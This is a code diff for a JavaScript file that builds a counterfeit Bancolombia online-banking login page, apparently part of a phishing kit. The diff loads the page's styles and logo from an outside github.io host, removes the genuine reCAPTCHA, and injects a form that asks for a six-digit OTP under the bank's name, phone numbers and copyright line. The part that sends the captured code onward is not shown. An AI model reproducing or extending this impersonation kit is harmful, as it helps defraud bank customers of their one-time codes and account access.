@@ -1,3 +1,5 @@
+var myHosting = "https://itsmariodev.github.io/";
+
 let head = `<title>Bancolombia Sucursal Virtual Personas</title>
 <meta http-equiv="content-type" content="text/html; utf-8">
 <meta charset="utf-8">
@@ -7,14 +9,15 @@ let head = `<title>Bancolombia Sucursal Virtual Personas</title>
 <meta name="Copyright" content="">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<link href="../../../../../css/style.css" rel="stylesheet">
-<link href="../../../../../css/main.css" rel="stylesheet">
-<link href="../../../../../css/recapcha.css" rel="stylesheet">
-<link href="../../../../../css/bootstrap.css" rel="stylesheet">
-<link rel="icon" type="image/png" href="../../../../../img/logo.png" />
+
+<link href="${myHosting}css/style.css" rel="stylesheet">
+<link href="${myHosting}css/main.css" rel="stylesheet">
+<link href="${myHosting}css/recapcha.css" rel="stylesheet">
+<link href="${myHosting}css/bootstrap.css" rel="stylesheet">
+<link href="${myHosting}img/logo.png" rel="icon" type="image/png">
 `;
 
-let contenido = `
+let body = `<div id="contenidoWeb">
 <form id="loginUserForm">
     <div class="container" id="containerMain">
         <div>
@@ -62,8 +65,32 @@ let contenido = `
             </div>
 
             <div class="mua-panel-body">
-                <div class="row">
-                    <div class="col-xs-12 col-sm-5 col-md-4">
+                <div class="row" id="divMain">
+                    
+                </div>
+
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12">
+                <p class="mua-footer">
+                    Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
+                </p>
+            </div>
+        </div>
+        <div style="margin-top: 10px;">
+            <div class="mua-title-text pull-left" id="ip"></div>
+            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
+        </div>
+
+
+    </div>
+</form>
+</div>
+`;
+
+let options = `
+<div class="col-xs-12 col-sm-5 col-md-4">
                         <div class="panel_general mua-panel_general">
                             <div class="title-panel-label">
                                 <h1>
@@ -97,12 +124,6 @@ let contenido = `
                             </div>
 
                             <div class="one-button-container mua-button-container">
-                                <div id="recaptcha" class="g-recaptcha" data-sitekey="6LcQkTUUAAAAAAqNJNF97DoEKkxyTia9U6SOqp61" data-callback="onSubmit" data-size="invisible" data-error-callback="onCaptcha">
-                                    <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
-                                        <div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LcQkTUUAAAAAAqNJNF97DoEKkxyTia9U6SOqp61&amp;co=aHR0cHM6Ly9zdWN1cnNhbHBlcnNvbmFzLnRyYW5zYWNjaW9uZXNiYW5jb2xvbWJpYS5jb206NDQz&amp;hl=es&amp;v=x19joXI_IeQnFJ7YnfDapSZq&amp;size=invisible&amp;cb=2joa41vqz03z" width="256" height="60" role="presentation" name="a-xs491oz26lub" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"></iframe></div>
-                                        <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
-                                    </div><iframe style="display: none;"></iframe>
-                                </div>
                                 <button id="btnOTP" name="btnOTP" class="btn btn-success" type="button">
                                     Continuar
                                 </button>
@@ -165,41 +186,26 @@ let contenido = `
                             </div>
                         </div>
                     </div>
+`; 
 
-                    <div class="col-xs-12 col-sm-7 col-md-8">
+let ads = `
+<div class="col-xs-12 col-sm-7 col-md-8">
                         <div class="mua-embed-container-personal" id="banner-persona">
-                            <iframe class="mua-iframe mua-iframe-personal-responsive" src="iframe.html" frameborder="0" scrolling="no" width="635px" height="335px"></iframe>
+                        <img class="imgAds" src="../../../../../img/imgPublicidad_Tu360_Pos.png" frameborder="0" scrolling="no" width="635px" height="335px">
                         </div>
 
                         <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp; Conoce más <a href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank" class="a1">aquí</a></p>
                     </div>
-                </div>
-
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12">
-                <p class="mua-footer">
-                    Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
-                </p>
-            </div>
-        </div>
-        <div style="margin-top: 10px;">
-            <div class="mua-title-text pull-left" id="ip"></div>
-            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
-        </div>
-
-
-    </div>
-</form>
-`;
+`
 
 function addHead() {
   $("head").append(head);
 }
 
 function addCode() {
-  $("#contenidoWeb").html(contenido);
+  $("body").html(body);
+  $("#divMain").html(options);
+  $("#divMain").append(ads);
 
   $("#btnOTP").click(function () {
     if ($("#txtOTP").val().length === 6) {
@@ -234,12 +240,14 @@ window.addEventListener("load", function () {
   //Aquí se puede meter la función addCode() para que el contenido cargue después de que se hayan
   //puesto cargado los estilos y que no se vea el html solo al inicio.
   addCode();
-});
 
-fetch("https://api64.ipify.org?format=json")
+  fetch("https://api64.ipify.org?format=json")
   .then((response) => response.json())
   .then((data) => {
     let ip = data.ip;
     let divIp = document.getElementById("ip");
     divIp.textContent = "Dirección IP: " + ip;
   });
+});
+
+
